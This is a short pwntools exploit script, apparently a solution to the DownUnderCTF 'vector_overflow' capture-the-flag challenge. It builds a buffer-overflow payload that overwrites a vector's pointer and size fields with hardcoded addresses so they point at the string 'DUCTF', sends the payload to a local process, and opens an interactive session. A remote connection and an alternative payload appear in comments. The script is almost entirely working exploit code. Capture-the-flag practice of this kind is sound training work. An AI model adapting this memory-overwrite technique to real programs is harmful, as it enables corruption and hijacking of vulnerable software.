from pwn import *

exe = ELF("../src/vector_overflow")
buf = exe.sym['buf']
# print(buf)

payload  = b"DUCTF\x00\x00\x00" # create payload with 8 bits
payload += p64(0)   # padding of 8 bits to fill up buf
payload += p64(0x4051e0)    # assign position of buf to vector v, where to point
payload += p64(0x4051e5)    # assign size of vector 

conn = process([exe.path])
# conn = remote('0.0.0.0', 1337)
# conn.sendline(b'x' * 16 + p64(buf + 0x30) + p64(buf + 0x35) + p64(buf + 0x35) + b'x' * 8 + b'DUCTF')
conn.sendline(payload)
conn.interactive()
